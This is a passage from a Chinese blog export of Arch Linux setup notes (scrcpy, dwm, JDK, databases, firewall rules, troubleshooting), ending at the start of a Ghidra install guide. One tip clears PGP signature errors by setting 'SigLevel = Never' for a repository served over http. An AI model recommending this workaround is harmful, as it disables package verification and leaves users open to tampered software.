<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yay -S scrcpy</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Scrcpy 的命令参数</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>关闭手机屏幕</strong></td>
<td><code>scrcpy -S</code></td>
</tr>
<tr>
<td><strong>限制画面分辨率</strong></td>
<td><code>scrcpy -m 1024</code> (比如限制为 1024)</td>
</tr>
<tr>
<td><strong>修改视频码率</strong></td>
<td><code>scrcpy -b 4M</code> (默认 8Mbps，改成 4Mbps)</td>
</tr>
<tr>
<td><strong>裁剪画面</strong></td>
<td><code>scrcpy -c 1224:1440:0:0</code> 表示分辨率 1224x1440 并且偏移坐标为 (0,0)</td>
</tr>
<tr>
<td><strong>多设备切换</strong></td>
<td><code>scrcpy -s 设备ID</code> (使用 <code>adb devices</code> 命令查看设备ID)</td>
</tr>
<tr>
<td><strong>窗口置顶</strong></td>
<td><code>scrcpy -T</code></td>
</tr>
<tr>
<td><strong>显示触摸点击</strong></td>
<td><code>scrcpy -t</code> 在演示或录制教程时，可在画面上对应显示出点击动作</td>
</tr>
<tr>
<td><strong>全屏显示</strong></td>
<td><code>scrcpy -f</code></td>
</tr>
<tr>
<td><strong>文件传输默认路径</strong></td>
<td><code>scrcpy --push-target /你的/目录</code> 将文件拖放到 scrcpy 可以传输文件，此命令指定默认保存目录</td>
</tr>
<tr>
<td><strong>只读模式(仅显示不控制)</strong></td>
<td><code>scrcpy -n</code></td>
</tr>
<tr>
<td><strong>屏幕录像</strong></td>
<td><code>scrcpy -r 视频文件名.mp4</code> 或 <code>.mkv</code></td>
</tr>
<tr>
<td><strong>屏幕录像 (禁用电脑显示)</strong></td>
<td><code>scrcpy -Nr 文件名.mkv</code></td>
</tr>
<tr>
<td><strong>设置窗口标题</strong></td>
<td><code>scrcpy --window-title &#39;异次元好棒！&#39;</code></td>
</tr>
<tr>
<td><strong>同步传输声音</strong></td>
<td>可借助 <a href="https://github.com/rom1v/usbaudio">USBaudio</a> 这个开源项目实现，但仅支持 <a href="https://www.iplaysoft.com/os/linux-platform">Linux</a> 系统</td>
</tr>
</tbody></table>
<h4 id="使用-WIFi-连接手机"><a href="#使用-WIFi-连接手机" class="headerlink" title="使用 WIFi 连接手机"></a>使用 WIFi 连接手机</h4><p>Scrcpy 使用 adb 与 Android 设备通讯，而 adb 本身是支持无线连接的。因此除了 USB 数据线之外，我们也能无线使用。前提是需要保证手机和电脑处于同一<a href="https://www.iplaysoft.com/tag/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a> (连接到相同的 <a href="https://www.iplaysoft.com/tag/wifi">WiFi</a> 路由器)，步骤如下：</p>
<ol>
<li>查询设备当前的 IP 地址 (设置 →关于手机→状态)</li>
<li>启用 adb TCP&#x2F;IP 连接，执行命令：<code>adb tcpip 5555</code>，其中 5555 为端口号</li>
<li>拔掉你的数据线</li>
<li>通过 WiFi 进行连接，执行命令：<code>adb connect 设备IP地址:5555</code></li>
<li>重新启动 scrcpy 即可</li>
<li>如果 WiFi 较慢，可以调整码率：<code>scrcpy -b 3M -m 800</code>，意思是限制 3 Mbps，画面分辨率限制 800，数值可以随意调整。</li>
<li>如需切换回 USB 模式，执行：<code>adb usb</code></li>
</ol>
<p><strong>dwm</strong></p>
<p>安装编译环境及依赖包：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S base-devel gcc make xorg xorg-xinit xorg-server xorg-apps </span><br></pre></td></tr></table></figure>

<p>安装dwm：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://git.suckless.org/dwm</span><br></pre></td></tr></table></figure>

<p>安装st：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://git.suckless.org/st</span><br><span class="line"></span><br><span class="line">wget https://st.suckless.org/patches/alpha/st-alpha-0.8.2.diff</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打补丁：</span></span><br><span class="line">patch &lt; st-alpha-0.8.2.diff</span><br></pre></td></tr></table></figure>

<p>配置启动文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;exec dwm&quot; &gt; ~/.xinitrc</span><br></pre></td></tr></table></figure>

<p><strong>桌面壁纸</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S feh</span><br><span class="line">echo &quot;exec feh --bg-scale ./bg.jpg&quot; &gt;&gt; ~/.xinitrc</span><br></pre></td></tr></table></figure>



<h2 id="开发环境安装"><a href="#开发环境安装" class="headerlink" title="开发环境安装"></a>开发环境安装</h2><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Java_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">JDK</a> </p>
</blockquote>
<p>JDK与OpenJDK不同，OpenJDK源代码不完整，且不包含部署功能，只包含最精简的JDK，</p>
<p>Oracle官网下载：</p>
<p>Java SE Development Kit 8u241: <a href="https://www.oracle.com/java/technologies/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</a></p>
<p>配置环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据解压的目录修改添加</span></span><br><span class="line">export JAVA_HOME=/[path]/jdk1.8.0_241</span><br><span class="line">export JRE_HOME=$JAVA_HOME/jre</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH</span><br><span class="line">export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置字体反锯齿</span></span><br><span class="line">export _JAVA_OPTIONS=&#x27;-Dawt.useSystemAAFontSettings=lcd&#x27;</span><br></pre></td></tr></table></figure>



<blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Eclipse_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Eclipse</a></p>
</blockquote>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S mysql</span><br></pre></td></tr></table></figure>

<p>根据提示进行初始化操作：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200309122605908.png" alt="image-20200309122605908"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mysqld --initialize --user=mysql --basedir=/usr --datadir=/var/lib/mysql</span><br></pre></td></tr></table></figure>

<p>得到临时密码</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200309122832930.png" alt="image-20200309122832930"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start mysqld # 启动MySQL服务</span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>



<h3 id="Mariadb"><a href="#Mariadb" class="headerlink" title="Mariadb"></a>Mariadb</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S mariadb</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200328172207737.png" alt="image-20200328172207737"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</span><br><span class="line">sudo systemctl start mysqld.service # 启动服务</span><br><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure>

<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可视化管理工具</span></span><br><span class="line">pacman -S redis-desktop-manager</span><br></pre></td></tr></table></figure>



<h3 id="PHP-amp-Apache"><a href="#PHP-amp-Apache" class="headerlink" title="PHP&amp;Apache"></a>PHP&amp;Apache</h3><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Apache_HTTP_Server_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Apache_HTTP_Server_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S httpd php php-apache</span><br><span class="line">yay -S phpstorm # 最好自己去官网下载安装</span><br></pre></td></tr></table></figure>



<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S python</span><br><span class="line">pacman -S pycharm # 最好自己去官网下载安装</span><br></pre></td></tr></table></figure>



<h2 id="系统备份"><a href="#系统备份" class="headerlink" title="系统备份"></a>系统备份</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S timeshift</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.jianshu.com/p/b03a51c682a5">https://www.jianshu.com/p/b03a51c682a5</a></p>
</blockquote>
<h2 id="系统软件"><a href="#系统软件" class="headerlink" title="系统软件"></a>系统软件</h2><h3 id="防病毒-无必要"><a href="#防病毒-无必要" class="headerlink" title="防病毒(无必要)"></a>防病毒(无必要)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S clamav clamtk</span><br><span class="line"></span><br><span class="line">sudo freshclam # 更新病毒库</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 更新速度太慢,手动下载 ###</span></span></span><br><span class="line">http://database.clamav.net/main.cvd</span><br><span class="line">http://database.clamav.net/daily.cvd</span><br><span class="line">http://database.clamav.net/bytecode.cvd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拷贝到 /var/lib/clamav 目录下</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##</span></span></span><br><span class="line"></span><br><span class="line">sudo systemctl start clamav-daemon</span><br><span class="line">sudo systemctl enable clamav-daemon # 开启自动更新病毒库</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行扫描</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">clamscan myfile</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">clamscan -r -i /home</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">clamscan -r -i --exclude-dir=<span class="string">&#x27;^/sys|^/proc|^/dev|^/lib|^/bin|^/sbin&#x27;</span> /</span></span><br></pre></td></tr></table></figure>

<h3 id="优化管理"><a href="#优化管理" class="headerlink" title="优化管理"></a>优化管理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yay -S stacer</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200311125032644.png" alt="image-20200311125032644" style="zoom:50%;" />

<h3 id="常用防火墙配置"><a href="#常用防火墙配置" class="headerlink" title="常用防火墙配置"></a>常用防火墙配置</h3><blockquote>
<p><a href="https://www.cnblogs.com/gavinpan/p/11220474.html">https://www.cnblogs.com/gavinpan/p/11220474.html</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Iptables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Iptables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<p><strong>IPv4 防火墙</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable iptables</span><br><span class="line">systemctl start iptables</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT #允许本地回环接口(即运行本机访问本机)</span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT #允许已建立的或相关连的通行</span><br><span class="line">iptables -A OUTPUT -j ACCEPT #允许所有本机向外的访问</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT #允许访问22端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT #允许访问80端口</span><br><span class="line">iptables -A INPUT -j REJECT    #禁止其他未允许的规则访问</span><br><span class="line">iptables -A FORWARD -j REJECT  #禁止其他未允许的规则访问</span><br><span class="line"></span><br><span class="line">iptables-save &gt; /etc/iptables/iptables.rules #保存配置</span><br></pre></td></tr></table></figure>

<p><strong>IPv6 防火墙</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start ip6tables</span><br><span class="line">systemctl enable ip6tables</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip6tables -A INPUT -s ::1 -d ::1 -j ACCEPT</span><br><span class="line">ip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT </span><br><span class="line">ip6tables -A INPUT -p ipv6-icmp -j ACCEPT </span><br><span class="line">ip6tables -A OUTPUT -j ACCEPT</span><br><span class="line">ip6tables -A INPUT -j REJECT</span><br><span class="line">ip6tables -A FORWARD -j REJECT</span><br><span class="line"></span><br><span class="line">ip6tables-save &gt; /etc/iptables/ip6tables.rules #保存配置</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>ip6tables -A INPUT -p ipv6-icmp -j ACCEPT</code> </p>
<p>只有IPv6 icmp数据包可以经过网络传输时，SLAAC才可以正常工作。所以在要配置IPv6的计算机上，<strong>必须</strong>修改防火墙，允许ipv6-icmp数据包进入。</p>
</blockquote>
<h2 id="bash-优化"><a href="#bash-优化" class="headerlink" title="bash 优化"></a>bash 优化</h2><ul>
<li>zsh + <a href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a></li>
</ul>
<h2 id="垃圾清理"><a href="#垃圾清理" class="headerlink" title="垃圾清理"></a>垃圾清理</h2><blockquote>
<p><a href="https://blog.csdn.net/weixin_43968923/article/details/88768951">https://blog.csdn.net/weixin_43968923/article/details/88768951</a></p>
<p><a href="https://www.cnblogs.com/archer-yjun/p/11013306.html">https://www.cnblogs.com/archer-yjun/p/11013306.html</a></p>
</blockquote>
<p>清理系统中无用的包：(尽量保留 linux linux-headers 等重要软件包以防滚崩)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -R $(pacman -Qdtq)</span><br></pre></td></tr></table></figure>

<p>清除已下载的安装包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -Scc</span><br></pre></td></tr></table></figure>

<p>查看日志文件大小：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo journalctl --disk-usage</span><br></pre></td></tr></table></figure>

<p>删除指定大小的日志文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo journalctl --vacuum-size=50M</span><br></pre></td></tr></table></figure>

<p>删除崩溃日志：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm /var/lib/systemd/coredump/*</span><br></pre></td></tr></table></figure>



<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="invalid-or-corrupted-package-PGP-signature"><a href="#invalid-or-corrupted-package-PGP-signature" class="headerlink" title="invalid or corrupted package (PGP signature))"></a>invalid or corrupted package (PGP signature))</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br><span class="line"></span><br><span class="line">修改或添加:</span><br><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel = Never  # ***</span><br><span class="line">Server = http://mirrors.163.com/archlinux-cn/$arch</span><br></pre></td></tr></table></figure>

<h3 id="更新系统内核后无法进入系统"><a href="#更新系统内核后无法进入系统" class="headerlink" title="更新系统内核后无法进入系统"></a>更新系统内核后无法进入系统</h3><blockquote>
<p>情况：upgrad linux (5.5.7.arch1-1 -&gt; 5.5.8.arch1-1)</p>
<p>时间：2020-03-08</p>
</blockquote>
<p>引导后提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Loading Linux linux ...</span><br><span class="line">error: premature end of file /vmlinuz-linux.</span><br><span class="line">Loading initial ramdisk ...</span><br><span class="line">error: you need to load the kernel first.</span><br><span class="line"></span><br><span class="line">Press any key to continue...</span><br></pre></td></tr></table></figure>

<p>解决方案：</p>
<p>进LiveCD，挂载 <code>/</code> 和 <code>/boot</code> </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt # 进入系统</span><br></pre></td></tr></table></figure>

<p>切换内核到LTS版本（临时）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S linux-lts linux-lts-headers</span><br></pre></td></tr></table></figure>

<p>安装完成后，重启进入 grub 引导时按 e 进行编辑</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原为 linux /vmlinuz-linux</span></span><br><span class="line">linux /vmlinuz-linux-lts</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原为 initrd /initramfs-linux.img</span></span><br><span class="line">initrd /initramfs-linux-lts.img</span><br></pre></td></tr></table></figure>

<p>F10 进入即可，</p>
<p>进入系统后发现独立显卡驱动无法正常工作，LiveCD 中尝试卸载当前内核发现：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:: removing linux breaks dependency &#x27;linux&#x27; required by bbswitch</span><br><span class="line">:: removing linux breaks dependency &#x27;linux&#x27; required by nvidia</span><br></pre></td></tr></table></figure>

<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>卸载当前系列的包，重新安装最新版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -R bbswitch nvidia</span><br><span class="line">pacman -R linux</span><br><span class="line">pacman -S linux</span><br><span class="line">pacman -S nvidia bbswitch</span><br></pre></td></tr></table></figure>

<p>重启即可</p>
<p><strong>安装有NVIDIA驱动的可以在更新前先卸载，更新完内核后重新安装即可避免更新后出现上述情况</strong></p>
<blockquote>
<p>该方法于2020-03-15更新时有效</p>
<p>upgraded linux (5.5.8.arch1-1 -&gt; 5.5.9.arch1-2)</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -R bbswitch nvidia</span><br><span class="line">sudo pacman -Syu</span><br><span class="line">sudo pacman -S nvidia bbswitch</span><br></pre></td></tr></table></figure>



<h3 id="日常更新之更新出错"><a href="#日常更新之更新出错" class="headerlink" title="日常更新之更新出错"></a>日常更新之更新出错</h3><blockquote>
<p>发生时间：2020-05-05</p>
</blockquote>
<p>出现的问题：</p>
<p><code>pacman</code> 更新失败、同时 linux 内核更新失败，<code>pacman</code> 丢失无法使用，重启后无法进入系统（无内核）</p>
<p>更新日志：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[2020-05-05T08:54:19+0800] [PACMAN] Running &#x27;pacman -Su&#x27;</span><br><span class="line">[2020-05-05T08:54:19+0800] [PACMAN] starting full system upgrade</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] running &#x27;60-mkinitcpio-remove.hook&#x27;...</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] running &#x27;70-dkms-remove.hook&#x27;...</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] transaction started</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded ca-certificates-mozilla (3.51.1-1 -&gt; 3.52-1)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded libtool (2.4.6+42+gb88cebd5-11 -&gt; 2.4.6+42+gb88cebd5-12)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded ipython (7.13.0-1 -&gt; 7.14.0-2)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded nss (3.51.1-1 -&gt; 3.52-1)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded lib32-nss (3.51.1-1 -&gt; 3.52-1)</span><br><span class="line">[2020-05-05T08:54:35+0800] [ALPM] upgraded libmicrohttpd (0.9.70-1 -&gt; 0.9.70-2)</span><br><span class="line">[2020-05-05T08:54:36+0800] [ALPM] upgraded linux (5.6.8.arch1-1 -&gt; 5.6.10.arch1-1)</span><br><span class="line">[2020-05-05T08:54:39+0800] [ALPM] upgraded linux-headers (5.6.8.arch1-1 -&gt; 5.6.10.arch1-1)</span><br><span class="line">[2020-05-05T08:54:39+0800] [ALPM] upgraded linux-lts (5.4.36-1 -&gt; 5.4.38-1)</span><br><span class="line">[2020-05-05T08:54:41+0800] [ALPM] upgraded linux-lts-headers (5.4.36-1 -&gt; 5.4.38-1)</span><br><span class="line">[2020-05-05T08:54:41+0800] [ALPM] transaction failed</span><br></pre></td></tr></table></figure>

<p>猜测发生原因：更新了<code>pacman</code> ，而保存软件包的 <code>/var/cache/pacman/pkg</code> 文件夹被我之前整成软连接了，可能在此次更新过程中被当莫名删掉了，然后就找不到下载的安装包，导致后来的内核、pacman都安装失败（然而都已经卸载了。。。）</p>
<h4 id="解决途径："><a href="#解决途径：" class="headerlink" title="解决途径："></a>解决途径：</h4><p>回到 Arch 安装盘，挂载分区和引导之后重新安装内核：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt linux </span><br></pre></td></tr></table></figure>

<p>删除 <code>/var/lib/pacman/local/pacman-5.2.1-5</code> 文件夹，然后再安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacstarp /mnt pacman</span><br></pre></td></tr></table></figure>



<h3 id="回滚操作"><a href="#回滚操作" class="headerlink" title="回滚操作"></a>回滚操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装包缓存位置：</span></span><br><span class="line">cd /var/cache/pacman/pkg</span><br><span class="line"></span><br><span class="line">pacman -S downgrade</span><br><span class="line"></span><br><span class="line">downgrade 软件名</span><br></pre></td></tr></table></figure>



<h3 id="卸载MySQL更换Mariadb"><a href="#卸载MySQL更换Mariadb" class="headerlink" title="卸载MySQL更换Mariadb"></a>卸载MySQL更换Mariadb</h3><p>执行 <code>sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</code> 时报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Installing MariaDB/MySQL system tables in &#x27;/var/lib/mysql&#x27; ...</span><br><span class="line">2020-03-28 17:24:00 0 [ERROR] InnoDB: Invalid flags 0x4800 in ./ibdata1</span><br><span class="line">2020-03-28 17:24:00 0 [ERROR] InnoDB: Plugin initialization aborted with error Data structure corruption</span><br><span class="line">2020-03-28 17:24:01 0 [ERROR] Plugin &#x27;InnoDB&#x27; init function returned error.</span><br><span class="line">2020-03-28 17:24:01 0 [ERROR] Plugin &#x27;InnoDB&#x27; registration as a STORAGE ENGINE failed.</span><br><span class="line">2020-03-28 17:24:01 0 [ERROR] Unknown/unsupported storage engine: InnoDB</span><br><span class="line">2020-03-28 17:24:01 0 [ERROR] Aborting</span><br><span class="line"></span><br><span class="line">Installation of system tables failed!  Examine the logs in</span><br><span class="line">/var/lib/mysql for more information.</span><br></pre></td></tr></table></figure>

<p>解决方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm -rf /var/lib/mysql</span><br></pre></td></tr></table></figure>



<h3 id="plasma桌面特效失效"><a href="#plasma桌面特效失效" class="headerlink" title="plasma桌面特效失效"></a>plasma桌面特效失效</h3><p>一次开机突然所有的桌面特效失效了，包括透明效果、动画等等</p>
<blockquote>
<p><a href="https://blog.csdn.net/u011054333/article/details/53653506">https://blog.csdn.net/u011054333/article/details/53653506</a></p>
</blockquote>
<p>解决方法：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200331082850039.png" alt="进入设置-显示与监控"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200331082903245.png" alt="进入混成器设置"></p>
<p>重新选择渲染后端后应用即可解决。</p>
<h3 id="pacman-报错"><a href="#pacman-报错" class="headerlink" title="pacman 报错"></a>pacman 报错</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:: 正在同步软件包数据库...</span><br><span class="line">错误：无法升级 core (无法锁定数据库)</span><br><span class="line">错误：无法升级 extra (无法锁定数据库)</span><br><span class="line">错误：无法升级 community (无法锁定数据库)</span><br><span class="line">错误：无法升级 multilib (无法锁定数据库)</span><br><span class="line">错误：无法升级 archlinuxcn (无法锁定数据库)</span><br></pre></td></tr></table></figure>

<p>解决方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm  /var/lib/pacman/db.lck</span><br></pre></td></tr></table></figure>



<h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h2><h3 id="磁盘测速"><a href="#磁盘测速" class="headerlink" title="磁盘测速"></a>磁盘测速</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo hdparm -tT /dev/sdb2</span><br><span class="line"></span><br><span class="line">/dev/sdb2:</span><br><span class="line"> Timing cached reads:   31986 MB in  1.99 seconds = 16111.27 MB/sec</span><br><span class="line"> Timing buffered disk reads: 1308 MB in  3.00 seconds = 435.61 MB/sec</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="修改卷标"><a href="#修改卷标" class="headerlink" title="修改卷标"></a>修改卷标</h3><blockquote>
<p><a href="https://linux.cn/article-1978-1.html">https://linux.cn/article-1978-1.html</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo blkid -c /dev/null # 查看卷标信息</span><br><span class="line">sudo e2label /dev/sda3 Arch_home</span><br></pre></td></tr></table></figure>

<h3 id="视频合并"><a href="#视频合并" class="headerlink" title="视频合并"></a>视频合并</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S mencoder</span><br><span class="line">mencoder -ovc copy -oac mp3lame xxx.mkv xxxx.mkv -o out.mkv </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>Ghidra 安装与使用指南</title>
    <url>/2022/10/05/Ghidra/</url>
    <content><![CDATA[<h1 id="Ghidra"><a href="#Ghidra" class="headerlink" title="Ghidra"></a>Ghidra</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h2><ul>
<li><a href="https://ghidra-sre.org/">Ghidra</a> 是一个由美国国家安全局开发的开源免费的逆向工程工具，跟 IDA Pro 有的一拼。</li>
</ul>
<blockquote>
<p>📖 wiki:  <a href="https://en.wikipedia.org/wiki/Ghidra">https://en.wikipedia.org/wiki/Ghidra</a></p>
<p>Ghidra (pronounced Gee-druh; &#x2F;ˈɡiːdrə&#x2F;) is a free and open source reverse engineering tool developed by the National Security Agency (NSA) of the United States. The binaries were released at RSA Conference in March 2019; the sources were published one month later on GitHub. Ghidra is seen by many security researchers as a competitor to IDA Pro. The software is written in Java using the Swing framework for the GUI. The decompiler component is written in C++. Ghidra plugins can be developed in Java or in Python (provided via Jython).</p>
</blockquote>
<p>感觉 Ghidra 比较不错的几点：</p>
<ul>
<li>开源免费</li>
<li>全平台可用(Windows、MacOS、Linux)</li>
<li>32位、64位程序都可以直接拖拽进来分析，不需要像 IDA 那样分析 32位、64 位程序需要选用指定版本的程序打开才能进行反编译操作</li>
</ul>
<p>缺点:</p>
<ul>
<li>没有 IDA Pro 的远程调试、动态调试</li>
<li>支持的处理器系列没有 IDA Pro 多，不过已经足够用了 (x86、arm、mips、risc-v都是支持的)</li>
<li>部分反汇编结果不如 IDA Pro 智能</li>
</ul>
<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a><strong>下载安装</strong></h2><p>📥 <strong>下载</strong>：</p>
<ul>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a><ul>
<li>截止本文发布时的最新版本（<strong>ghidra_10.1.5_PUBLIC_20220726</strong>）<a href="https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.1.5_build/ghidra_10.1.5_PUBLIC_20220726.zip">下载链接</a></li>
</ul>
</li>
</ul>
<p>📦 <strong>环境</strong>：</p>
<p><strong>只要能正常跑起来 Ghidra，就尽可能不要再动 Java 环境了</strong></p>
<ul>
<li><p>需要安装 JDK 11（MacOS 环境下以 JDK 1.8 执行会遇到闪退的问题）。</p>
<ul>
<li><blockquote>
<p>JDK 版本根据 github 最新的文档中指明的为准，截止本文发布时需安装 JDK 11</p>
</blockquote>
</li>
<li><a href="https://adoptium.net/releases.html?variant=openjdk11&jvmVariant=hotspot">zip 压缩包版本</a></li>
<li><a href="https://www.oracle.com/sg/java/technologies/javase/jdk11-archive-downloads.html">exe 安装程序版本</a></li>
</ul>
</li>
<li><p>注意问题</p>
<ul>
<li>【Windows环境下 - 采用 exe 安装】：对于没有安装过 Java JDK 的环境配置最简单，下载安装包后无脑点完下一步即可（安装结束后打开 cmd 执行 <code>java -version</code> 如果不报错无需配置环境变量）<ul>
<li>如果主机上已经安装过 Java 1.8，如果没有只能在 1.8 版本下运行的程序，优先考虑卸载干净旧的 Java 版本后重新安装 Java JDK 11</li>
<li>如果需要保留 1.8 版本，那么在直接安装 JDK 11后 ，环境变量会被覆盖为 JDK 11<ul>
